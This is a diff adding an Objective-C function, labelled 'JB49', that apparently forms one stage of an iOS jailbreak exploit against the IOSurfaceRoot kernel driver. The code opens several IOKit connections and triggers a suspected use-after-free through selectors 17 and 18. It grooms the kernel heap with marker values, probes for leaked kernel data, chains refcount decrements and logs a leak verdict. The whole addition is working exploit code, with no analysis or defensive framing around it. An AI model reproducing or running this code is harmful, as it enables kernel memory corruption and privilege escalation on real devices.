@@ -38396,3 +38396,281 @@ void iosurface_xcross_extract(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull do
         done(results);
     });
 }
+
+#pragma mark - JB49: Advanced UAF Data Extraction
+
+void iosurface_adv_extract(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        log(@"JB49: === Advanced UAF Data Extraction ===");
+
+        typedef int (*callmethod_fn)(unsigned int, uint32_t, const uint64_t *, uint32_t, const void *, size_t, uint64_t *, uint32_t *, void *, size_t *);
+        typedef int (*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t *, uint32_t, const uint64_t *, uint32_t, const void *, size_t, void *, uint32_t *, uint64_t *, uint32_t *);
+
+        void *(*sym_lookup)(const char *) = (void *(*)(const char *))dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        unsigned int (*sym_getService)(unsigned int, void *) = (unsigned int (*)(unsigned int, void *))dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        int (*sym_open)(unsigned int, unsigned int, unsigned int, unsigned int *) = (int (*)(unsigned int, unsigned int, unsigned int, unsigned int *))dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        int (*sym_close)(unsigned int) = (int (*)(unsigned int))dlsym(RTLD_DEFAULT, "IOServiceClose");
+        void (*sym_release)(unsigned int) = (void (*)(unsigned int))dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+
+        if (!sym_lookup || !sym_getService || !sym_open || !sym_close || !sym_call || !sym_async) {
+            log(@"JB49: ERROR missing symbols");
+            results[@"verdict"] = @"ERROR";
+            done(results);
+            return;
+        }
+
+        void *match = sym_lookup("IOSurfaceRoot");
+        unsigned int svc = sym_getService(0, match);
+        log([NSString stringWithFormat:@"JB49: svc=0x%x", svc]);
+        if (!svc) { results[@"verdict"] = @"ERROR"; done(results); return; }
+
+        unsigned int self_task = mach_task_self();
+        int l1Hits = 0;
+        int l2Hits = 0;
+        int l3Hits = 0;
+        int l4Hits = 0;
+
+        log(@"JB49: ===== L1: Async ReadBack sel17 (output via async) =====");
+        @try {
+            for (int t = 0; t < 3 && !isr_stopped(); t++) {
+                unsigned int conn1 = 0, conn2 = 0, gConn = 0;
+                int r1 = sym_open(svc, self_task, 0, &conn1);
+                int r2 = sym_open(svc, self_task, 0, &conn2);
+                int r3 = sym_open(svc, self_task, 0, &gConn);
+                if (r1 != 0 || r2 != 0 || r3 != 0) {
+                    if (r1 == 0) sym_close(conn1);
+                    if (r2 == 0) sym_close(conn2);
+                    if (r3 == 0) sym_close(gConn);
+                    continue;
+                }
+                unsigned int wp = jb41_newWakePort();
+                uint64_t regId = 50000 + (uint64_t)t * 100;
+                uint64_t in[3] = {regId, 0, 0};
+
+                jb41_callSel(conn1, 17, in, 24, 1, wp, sym_call, sym_async);
+                jb41_callSel(conn1, 18, in, 24, 0, wp, sym_call, sym_async);
+
+                uint64_t marker = 0xBEEF004900000000ULL | (uint64_t)t;
+                unsigned int gPorts[32];
+                int gCount = 0;
+                memset(gPorts, 0, sizeof(gPorts));
+                jb42_groomWithFields(gConn, 0x00000001, marker, 0xFFFFFF8012340000ULL, 0x11111111, 24, 32, gPorts, &gCount, sym_async);
+
+                uint8_t outBuf[64];
+                memset(outBuf, 0xEE, sizeof(outBuf));
+                size_t oSz = 24;
+                uint64_t outScalar[4] = {0};
+                uint32_t outScalarCnt = 4;
+                int readRc = jb42_callSelWithOutput(conn2, 17, in, 24, 1, wp, outScalar, &outScalarCnt, outBuf, &oSz, sym_call, sym_async);
+
+                int changed = 0;
+                for (int b = 0; b < 24; b++) {
+                    if (outBuf[b] != 0xEE) { changed = 1; break; }
+                }
+                int scHit = (outScalar[0] != 0 || outScalar[1] != 0);
+                if (changed || scHit) l1Hits++;
+
+                log([NSString stringWithFormat:@"JB49: [L1] t%d rc=0x%x oSz=%zu ch=%d scCnt=%u sc0=0x%llx sc1=0x%llx", t, (uint32_t)readRc, oSz, changed, outScalarCnt, outScalar[0], outScalar[1]]);
+
+                jb41_callSel(conn2, 18, in, 24, 0, wp, sym_call, sym_async);
+                jb42_freeGroom(gPorts, gCount);
+                jb41_dropPort(wp);
+                sym_close(conn1);
+                sym_close(conn2);
+                sym_close(gConn);
+            }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB49: [L1] EXCEPTION: %@", e.reason]);
+        }
+        results[@"l1_asyncRead"] = @(l1Hits);
+        log([NSString stringWithFormat:@"JB49: [L1] done hits=%d/3", l1Hits]);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        log(@"JB49: ===== L2: Sel6-16 Scan After Cross-Conn =====");
+        @try {
+            unsigned int conn1 = 0, conn2 = 0, gConn = 0;
+            int r1 = sym_open(svc, self_task, 0, &conn1);
+            int r2 = sym_open(svc, self_task, 0, &conn2);
+            int r3 = sym_open(svc, self_task, 0, &gConn);
+            if (r1 == 0 && r2 == 0 && r3 == 0) {
+                unsigned int wp = jb41_newWakePort();
+                uint64_t in[3] = {51000, 0, 0};
+
+                jb41_callSel(conn1, 17, in, 24, 1, wp, sym_call, sym_async);
+                jb41_callSel(conn1, 18, in, 24, 0, wp, sym_call, sym_async);
+
+                unsigned int gPorts[32];
+                int gCount = 0;
+                memset(gPorts, 0, sizeof(gPorts));
+                jb42_groomWithFields(gConn, 0x00000001, 0xDEAD0049, 0xCAFEBABE, 0x99999999, 24, 32, gPorts, &gCount, sym_async);
+
+                jb41_callSel(conn2, 17, in, 24, 1, wp, sym_call, sym_async);
+
+                for (uint32_t sel = 6; sel <= 16; sel++) {
+                    if (isr_stopped()) break;
+                    uint64_t outScalar[4] = {0};
+                    uint32_t outScalarCnt = 4;
+                    uint8_t outBuf[64];
+                    memset(outBuf, 0, sizeof(outBuf));
+                    size_t oSz = 24;
+
+                    int rcSync = sym_call(conn2, sel, NULL, 0, in, 24, outScalar, &outScalarCnt, outBuf, &oSz);
+                    int hasData = 0;
+                    for (int b = 0; b < 24; b++) {
+                        if (outBuf[b] != 0) { hasData = 1; break; }
+                    }
+                    int scHit = (outScalar[0] != 0 || outScalar[1] != 0);
+
+                    int rcAsync = jb42_callSelWithOutput(conn2, sel, in, 24, 1, wp, outScalar, &outScalarCnt, outBuf, &oSz, sym_call, sym_async);
+                    int hasDataA = 0;
+                    for (int b = 0; b < 24; b++) {
+                        if (outBuf[b] != 0) { hasDataA = 1; break; }
+                    }
+                    int scHitA = (outScalar[0] != 0 || outScalar[1] != 0);
+
+                    if (hasData || scHit || hasDataA || scHitA) l2Hits++;
+                    log([NSString stringWithFormat:@"JB49: [L2] sel%u sync=0x%x d=%d sc=%d async=0x%x d=%d sc=%d", sel, (uint32_t)rcSync, hasData, scHit, (uint32_t)rcAsync, hasDataA, scHitA]);
+                }
+
+                jb41_callSel(conn2, 18, in, 24, 0, wp, sym_call, sym_async);
+                jb42_freeGroom(gPorts, gCount);
+                jb41_dropPort(wp);
+                sym_close(conn1);
+                sym_close(conn2);
+                sym_close(gConn);
+            }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB49: [L2] EXCEPTION: %@", e.reason]);
+        }
+        results[@"l2_selScan"] = @(l2Hits);
+        log([NSString stringWithFormat:@"JB49: [L2] done hits=%d", l2Hits]);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        log(@"JB49: ===== L3: Double-Dangling Refcount Decrement Chain =====");
+        @try {
+            unsigned int conn1 = 0, conn2 = 0, gConn = 0;
+            int r1 = sym_open(svc, self_task, 0, &conn1);
+            int r2 = sym_open(svc, self_task, 0, &conn2);
+            int r3 = sym_open(svc, self_task, 0, &gConn);
+            if (r1 == 0 && r2 == 0 && r3 == 0) {
+                unsigned int wp = jb41_newWakePort();
+                uint64_t in[3] = {52000, 0, 0};
+
+                for (int cycle = 0; cycle < 5 && !isr_stopped(); cycle++) {
+                    jb41_callSel(conn1, 17, in, 24, 1, wp, sym_call, sym_async);
+                    jb41_callSel(conn1, 18, in, 24, 0, wp, sym_call, sym_async);
+
+                    unsigned int gPorts[32];
+                    int gCount = 0;
+                    memset(gPorts, 0, sizeof(gPorts));
+                    uint64_t rc_val = (uint64_t)(cycle + 1);
+                    jb42_groomWithFields(gConn, rc_val, 0xDEAD0049, 0xCAFEBABE, 0, 24, 32, gPorts, &gCount, sym_async);
+
+                    int d1 = jb41_callSel(conn2, 17, in, 24, 1, wp, sym_call, sym_async);
+                    int d2 = jb41_callSel(conn2, 17, in, 24, 1, wp, sym_call, sym_async);
+                    int d3 = jb41_callSel(conn2, 17, in, 24, 1, wp, sym_call, sym_async);
+                    int d4 = jb41_callSel(conn2, 17, in, 24, 1, wp, sym_call, sym_async);
+
+                    int pattern = 0;
+                    if (d1 == 0) pattern++;
+                    if (d2 == 0) pattern++;
+                    if (d3 == 0) pattern++;
+                    if (d4 == 0) pattern++;
+
+                    if (pattern > 1) l3Hits++;
+
+                    log([NSString stringWithFormat:@"JB49: [L3] c%d rc=%llu d1=0x%x d2=0x%x d3=0x%x d4=0x%x p=%d", cycle, rc_val, (uint32_t)d1, (uint32_t)d2, (uint32_t)d3, (uint32_t)d4, pattern]);
+
+                    jb41_callSel(conn2, 18, in, 24, 0, wp, sym_call, sym_async);
+                    jb42_freeGroom(gPorts, gCount);
+                }
+
+                jb41_dropPort(wp);
+                sym_close(conn1);
+                sym_close(conn2);
+                sym_close(gConn);
+            }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB49: [L3] EXCEPTION: %@", e.reason]);
+        }
+        results[@"l3_refcountChain"] = @(l3Hits);
+        log([NSString stringWithFormat:@"JB49: [L3] done hits=%d/5", l3Hits]);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        log(@"JB49: ===== L4: Input Size Variation (16,32,48,64 bytes) =====");
+        @try {
+            unsigned int conn1 = 0, conn2 = 0, gConn = 0;
+            int r1 = sym_open(svc, self_task, 0, &conn1);
+            int r2 = sym_open(svc, self_task, 0, &conn2);
+            int r3 = sym_open(svc, self_task, 0, &gConn);
+            if (r1 == 0 && r2 == 0 && r3 == 0) {
+                unsigned int wp = jb41_newWakePort();
+
+                size_t sizes[] = {16, 32, 48, 64};
+                for (int si = 0; si < 4 && !isr_stopped(); si++) {
+                    size_t sz = sizes[si];
+                    uint64_t regId = 53000 + (uint64_t)si * 100;
+                    uint64_t in[8] = {regId, 0, 0, 0, 0, 0, 0, 0};
+
+                    int regRc = jb41_callSel(conn1, 17, in, 24, 1, wp, sym_call, sym_async);
+                    jb41_callSel(conn1, 18, in, 24, 0, wp, sym_call, sym_async);
+
+                    unsigned int gPorts[32];
+                    int gCount = 0;
+                    memset(gPorts, 0, sizeof(gPorts));
+                    jb42_groomWithFields(gConn, 0x00000001, 0xDEAD0049, 0xCAFEBABE, 0x99999999, (int)sz, 32, gPorts, &gCount, sym_async);
+
+                    int dupRc = jb41_callSel(conn2, 17, in, 24, 1, wp, sym_call, sym_async);
+
+                    uint8_t outBuf[128];
+                    memset(outBuf, 0xAA, sizeof(outBuf));
+                    size_t oSz = sz;
+                    uint64_t outScalar[4] = {0};
+                    uint32_t outScalarCnt = 4;
+                    int readRc = jb42_callSelWithOutput(conn2, 17, in, sz, 1, wp, outScalar, &outScalarCnt, outBuf, &oSz, sym_call, sym_async);
+
+                    int changed = 0;
+                    for (size_t b = 0; b < sz; b++) {
+                        if (outBuf[b] != 0xAA) { changed = 1; break; }
+                    }
+                    int scHit = (outScalar[0] != 0 || outScalar[1] != 0);
+                    if (changed || scHit) l4Hits++;
+
+                    log([NSString stringWithFormat:@"JB49: [L4] sz=%zu reg=0x%x dup=0x%x read=0x%x ch=%d scCnt=%u sc0=0x%llx", sz, (uint32_t)regRc, (uint32_t)dupRc, (uint32_t)readRc, changed, outScalarCnt, outScalar[0]]);
+
+                    jb41_callSel(conn2, 18, in, 24, 0, wp, sym_call, sym_async);
+                    jb42_freeGroom(gPorts, gCount);
+                }
+
+                jb41_dropPort(wp);
+                sym_close(conn1);
+                sym_close(conn2);
+                sym_close(gConn);
+            }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB49: [L4] EXCEPTION: %@", e.reason]);
+        }
+        results[@"l4_sizeVar"] = @(l4Hits);
+        log([NSString stringWithFormat:@"JB49: [L4] done hits=%d/4", l4Hits]);
+
+        sym_release(svc);
+
+        NSString *verdict;
+        if (l2Hits > 0) verdict = @"SELECTOR_LEAK";
+        else if (l1Hits > 0) verdict = @"ASYNC_READBACK";
+        else if (l4Hits > 0) verdict = @"SIZE_VARIANT_LEAK";
+        else if (l3Hits > 0) verdict = @"MULTI_DECREMENT";
+        else verdict = @"NO_LEAK_PATH";
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB49: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB49-advextract-checkpoint.json", results);
+        done(results);
+    });
+}
